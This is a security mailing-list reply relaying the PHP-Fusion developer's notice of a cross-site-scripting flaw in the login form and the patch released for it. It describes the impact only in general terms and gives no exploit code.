    Vulnerability


In-Reply-To: <20050319082025.28662.qmail@....securityfocus.com>

The main developer Digitanium was notified, a patch has been developed and released on the main website.

Quote from Main Developer Digitanium at http://www.php-fusion.co.uk

Pi3cH has reported a cross-site-scripting vulnerability. PHP-Fusion does not properly validate user-supplied input passed by the log-in form in 'user_info_panel.php'.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PHP-Fusion software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. It's believed this is related to the new login system I plan to implement officially in v5.02, but have made available as a mod for v5.01. The details are not exact so I have added a security fix to v5.01 to close this vulnerability. I know this is must be annoying for everyone, especially as this is the 3rd security issue inside a month.

You must ensure that you update the file fusion_core.php, you can get the very latest file from the service pack which is available from the downloads area. The sourceforge files have also been updated. If you prefer to update manually please click Read More for details. Thanks to Pi3cH for the heads up.
